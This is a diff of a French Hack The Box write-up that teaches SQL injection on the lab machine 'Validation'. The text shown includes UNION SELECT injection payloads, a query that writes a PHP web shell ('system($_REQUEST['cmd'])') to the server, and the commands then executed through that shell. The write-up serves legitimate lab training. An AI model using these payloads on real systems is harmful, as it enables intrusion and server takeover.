@@ -8,10 +8,9 @@
 * 10.10.11.116
 * Crée par **ippsec**
 
-&nbsp;
-
 Ce write-up est destiné à **quelqu'un qui souhaiterait s'initier à sqli**, on va faire cela dans un environnement controlé dans la plateforme [Hackthebox](https://app.hackthebox.com/). Je tente d'expliquer le processus de A à Z et bien qu'il puisse sembler compliqué pour un néophyte il n'en est rien. Tout a un sens et avec un minimum de travail assidu cela semblera assez simple. D'ailleurs la machine en question est qualifiée de Facile. Il est conseillé d'éffectuer ce tuto dans une machine virtuelle, cela va de soi.
 
+Voir d'autres [**résolutions**](#resolutions) de cette machine.
 &nbsp;
 
 ## Connection à htb, accés au réséau controlé.
@@ -122,7 +121,7 @@ Host: 10.10.11.116 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 4566/o
 
 On va utiliser la fonction bash **extractPorts** qui est dans nôtre .zshrc pour profiter du fichier grepeable allPorts et copier les ports dans la clipboard (ceci est optionnel): 
 
-![Capture des port ouverts](/assets/validation/extractPorts.png)
+![Capture des port ouverts](../assets/validation/extractPorts.png)
 
 &nbsp;
 
@@ -172,7 +171,7 @@ http://10.10.11.116:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[ngi
 
 On va donc aller voir le site avec le navigateur:
 
-![Site sur le port 80](/assets/validation/site-port-80.png)
+![Site sur le port 80](../assets/validation/site-port-80.png)
 
 On voit un formulaire où l'on peut tester les entrées du formulaire et on constate :
 
@@ -240,22 +239,22 @@ select * FROM registration WHERE country=Afganistan'
 
 
 
-![Recherche du nom de la base](/assets/validation/injection.png)
+![Recherche du nom de la base](../assets/validation/injection.png)
 
 
 Puis comme on voit ci-dessus, on essaye avec un **```union select database() -- -```** et on tombe sur le nom de la base de données. Ici on voit le detail du code html generé et retourné par le serveur.
 
 Avec la commande **```union select version() -- -```** et on recupere la version de la base 10.5.11-MariaDB-1
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp.png)
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp2.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp2.png)
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp3.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp3.png)
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp4.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp4.png)
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp5.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp5.png)
 
 On continue avec les injections jusqu'a tenter d'écrire dans le path de l'url un fichier que l'on va nommer **prueba.php** que l'on puisse executer en faisant appel a l'url! (L'injection sql va nous permettre d'envoyer le fichier dans le serveur)  
 
@@ -272,19 +271,19 @@ username=kiki&country=Afganistan' union select "<?php system($_REQUEST['cmd']); 
 
 Et la sortie que genere le fichier php, l'erreur correspond au fait que nous n'avons pas passé de variable au paramettre cmd qui est attendu par le morceau de code php que l'on injecte.
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp6.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp6.png)
 
 &nbsp;
 
 Ici on voit que l'on passe la commande **whoami** a la "variable" **cmd** et cela nous retourne **www-data**
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp7.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp7.png)
 
 &nbsp;
 
 Si on passe la commande **cat**, on obtiens l'affichage du code de la page **account.php**
 
-![Recherche de la version de la base](/assets/validation/sqli-avec-burp8.png)
+![Recherche de la version de la base](../assets/validation/sqli-avec-burp8.png)
 
 &nbsp;
 
@@ -355,4 +354,13 @@ En essayant de faire un **su -** avec ce mot de passe, on obtient un accès **ro
 
 Note : Vous n'obtiendrez pas toujours une invite visible après avoir entré le mot de passe. Si vous entrez une commande telle que whoami vous verrez qu'il vous a bien permis d'avoir un shell en root.
 
-Voici le partage du resultat sur [HTB](https://www.hackthebox.com/achievement/machine/944728/382)
+[Pwned](https://www.hackthebox.com/achievement/machine/944728/382)
+
+---  
+<div style="text-align: right;"><a href="#" >up &uarr;</a>&nbsp;</div>
+
+<a name="resolutions"></a>
+Voir aussi en video :
+
+* [ippsec](https://www.youtube.com/watch?v=UqoVQ4dbYaI)  
+* [s4vitar](https://www.youtube.com/watch?v=78i-qbhEUVU)
